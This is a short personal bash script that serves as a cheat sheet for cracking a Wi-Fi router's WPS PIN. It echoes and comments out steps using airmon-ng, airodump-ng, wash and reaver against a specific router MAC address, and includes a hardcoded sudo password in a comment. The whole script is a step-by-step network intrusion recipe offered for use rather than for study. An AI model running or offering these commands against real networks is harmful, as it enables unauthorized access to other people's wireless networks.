#!/bin/bash
# This is a blank bash script document.
# Put your code below this line.
echo
echo
echo "sudo airmon-ng, finds interface name."
#PW='spike'
#echo $PW | sudo -S airmon-ng

echo "sudo airodump-ng<interface name>, get info for router."
#sudo airodump-ng

echo "sudo wash -i <interface name> -c <channel #> -s, checks if WPS locked, if not proceed."
#sudo wash -i wlo1 -c 4 -s

echo "sudo reaver -i <interface name> -b <mac address> --fail-wait=360, starts the crack."
#sudo reaver -i wlo1 -b EC:1A:59:C5:A2:1C --fail-wait=360

echo "
sudo systemctl disable dhcpcd
sudo systemctl stop dhcpcd
sudo ip link set wlo1 down
sudo wifi-menu
sudo ip link set wlo1 up"
#sudo systemctl disable dhcpcd
#sudo systemctl stop dhcpcd
sudo ip link set wlo1 down
#sudo wifi-menu
sudo ip link set wlo1 up
